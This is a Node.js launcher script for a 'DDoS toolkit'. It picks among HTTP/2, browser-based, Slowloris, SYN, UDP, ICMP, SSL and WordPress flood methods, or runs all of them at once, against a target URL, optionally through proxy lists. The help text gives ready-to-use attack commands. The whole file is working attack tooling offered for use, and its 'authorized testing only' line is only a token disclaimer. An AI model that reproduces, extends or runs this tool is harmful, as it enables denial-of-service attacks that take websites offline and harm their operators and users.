#!/usr/bin/env node
/*
 * ENZY ULTIMATE DDoS Toolkit
 * Created by Enzy
 * Auto-method detection and launcher
 */

const fs = require('fs');
const path = require('path');
const child_process = require('child_process');
const gradient = require('gradient-string');

// Colors
const colors = {
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m',
    reset: '\x1b[0m'
};

// ASCII Banner
const BANNER = gradient.vice(`
╔═══════════════════════════════════════════════════╗
║                                                   ║
║         ███████╗███╗   ██╗███████╗██╗   ██╗       ║
║         ██╔════╝████╗  ██║╚══███╔╝╚██╗ ██╔╝       ║
║         █████╗  ██╔██╗ ██║  ███╔╝  ╚████╔╝        ║
║         ██╔══╝  ██║╚██╗██║ ███╔╝    ╚██╔╝         ║
║         ███████╗██║ ╚████║███████╗   ██║          ║
║         ╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝          ║
║                                                   ║
║              ULTIMATE DDoS TOOLKIT                ║
║                 Created by Enzy                  ║
║                                                   ║
╚═══════════════════════════════════════════════════╝
`);

// Method detection
const METHODS = {
    '404': { file: 'methods/404.js', args: 6, desc: 'Steven Store HTTP/2 attack' },
    'BROWSER': { file: 'methods/browserddos.js', args: 6, desc: 'Puppeteer browser attack' },
    'MIX': { file: 'methods/mix.js', args: 5, desc: 'Mixed method attack' },
    'ICMP': { file: 'methods/icmpflood.js', args: 4, desc: 'ICMP/UDP flood' },
    'HTTP': { file: 'methods/http_flood.js', args: 5, desc: 'HTTP flood' },
    'SLOWLORIS': { file: 'methods/slowloris.js', args: 5, desc: 'Slowloris attack' },
    'TCP': { file: 'methods/tcp_syn.js', args: 5, desc: 'TCP SYN flood' },
    'UDP': { file: 'methods/udp_flood.js', args: 5, desc: 'UDP flood' },
    'SSL': { file: 'methods/ssl_kill.js', args: 5, desc: 'SSL/TLS kill' },
    'GOLDENEYE': { file: 'methods/goldeneye.js', args: 5, desc: 'WordPress attack' },
    'ALL': { file: null, args: 5, desc: 'All methods combined' }
};

// Auto-detect method based on arguments
function detectMethod(args) {
    if (args.length >= 7) {
        // Check if 6th arg is a proxy file
        const potentialProxy = args[6];
        if (fs.existsSync(potentialProxy) && potentialProxy.endsWith('.txt')) {
            return '404'; // Steven Store method
        }
    }
    
    if (args.length === 7) {
        return 'BROWSER'; // Browser method
    }
    
    if (args.length === 6) {
        const methodArg = args[5].toUpperCase();
        if (METHODS[methodArg]) {
            return methodArg;
        }
    }
    
    // Default to MIX
    return 'MIX';
}

// Show help
function showHelp() {
    console.log(BANNER);
    console.log(colors.cyan + 'ENZY ULTIMATE DDoS Toolkit - Auto Method Detection' + colors.reset);
    console.log('\n' + colors.yellow + 'Usage:' + colors.reset);
    console.log('  node enzy.js <URL> <TIME> <RPS> <THREADS> [METHOD] [PROXY_FILE]');
    console.log('  node enzy.js <URL> <TIME> <THREADS> <RATE_LIMIT> <PROXY_FILE> (for BROWSER)');
    
    console.log('\n' + colors.yellow + 'Auto-detection based on arguments:' + colors.reset);
    console.log('  6 args + proxy file -> 404.js (Steven Store)');
    console.log('  7 args -> browserddos.js');
    console.log('  6 args -> MIX/HTTP/SLOWLORIS/etc');
    console.log('  5 args -> Default MIX method');
    
    console.log('\n' + colors.yellow + 'Available Methods:' + colors.reset);
    for (const [name, info] of Object.entries(METHODS)) {
        console.log(`  ${colors.green}${name.padEnd(12)}${colors.reset} - ${info.desc}`);
    }
    
    console.log('\n' + colors.yellow + 'Examples:' + colors.reset);
    console.log(colors.cyan + '  # Auto detect (recommended):' + colors.reset);
    console.log('  node enzy.js https://target.com 60 1000 50');
    
    console.log(colors.cyan + '\n  # Steven Store method (404.js):' + colors.reset);
    console.log('  node enzy.js https://target.com 60 1000 50 proxies.txt');
    
    console.log(colors.cyan + '\n  # Browser DDoS:' + colors.reset);
    console.log('  node enzy.js https://target.com 60 10 100 proxies.txt');
    
    console.log(colors.cyan + '\n  # Specific method:' + colors.reset);
    console.log('  node enzy.js https://target.com 60 1000 50 HTTP');
    console.log('  node enzy.js https://target.com 60 1000 50 404');
    console.log('  node enzy.js https://target.com 60 1000 50 BROWSER proxies.txt');
    
    console.log('\n' + colors.red + 'Warning: For authorized testing only!' + colors.reset);
}

// Launch attack
function launchAttack(method, args) {
    const methodInfo = METHODS[method];
    
    if (!methodInfo) {
        console.log(colors.red + `[!] Unknown method: ${method}` + colors.reset);
        process.exit(1);
    }
    
    if (method === 'ALL') {
        // Launch all methods
        console.log(colors.yellow + '[!] Launching ALL methods...' + colors.reset);
        const allMethods = Object.keys(METHODS).filter(m => m !== 'ALL' && METHODS[m].file);
        
        allMethods.forEach(m => {
            console.log(colors.green + `[+] Starting ${m} method...` + colors.reset);
            const proc = child_process.spawn('node', [METHODS[m].file, ...args.slice(1)]);
            
            proc.stdout.on('data', (data) => {
                console.log(`[${m}] ${data}`);
            });
            
            proc.stderr.on('data', (data) => {
                console.error(`[${m}-ERROR] ${data}`);
            });
        });
        
        return;
    }
    
    if (!fs.existsSync(methodInfo.file)) {
        console.log(colors.red + `[!] Method file not found: ${methodInfo.file}` + colors.reset);
        console.log(colors.yellow + '[!] Run installer.sh first!' + colors.reset);
        process.exit(1);
    }
    
    console.log(colors.cyan + `[+] Launching ${method} attack...` + colors.reset);
    console.log(colors.cyan + `[+] Method: ${methodInfo.desc}` + colors.reset);
    
    const proc = child_process.spawn('node', [methodInfo.file, ...args.slice(1)]);
    
    proc.stdout.on('data', (data) => {
        console.log(data.toString());
    });
    
    proc.stderr.on('data', (data) => {
        console.error(data.toString());
    });
    
    proc.on('close', (code) => {
        console.log(colors.yellow + `[!] ${method} attack finished with code ${code}` + colors.reset);
    });
}

// Main
function main() {
    console.clear();
    console.log(BANNER);
    
    const args = process.argv;
    
    // Show help if no args
    if (args.length < 3 || args[2] === '--help' || args[2] === '-h') {
        showHelp();
        return;
    }
    
    // Auto-detect method
    const method = detectMethod(args);
    
    console.log(colors.green + '[+] Target: ' + args[2] + colors.reset);
    console.log(colors.green + '[+] Detected Method: ' + method + colors.reset);
    console.log(colors.green + '[+] Method Info: ' + METHODS[method].desc + colors.reset);
    console.log(colors.yellow + '[!] Starting in 3 seconds...' + colors.reset);
    
    setTimeout(() => {
        launchAttack(method, args);
    }, 3000);
}

// Error handling
process.on('uncaughtException', (err) => {
    console.log(colors.red + '[!] Error: ' + err.message + colors.reset);
});

process.on('unhandledRejection', (err) => {
    console.log(colors.red + '[!] Unhandled rejection: ' + err.message + colors.reset);
});

main();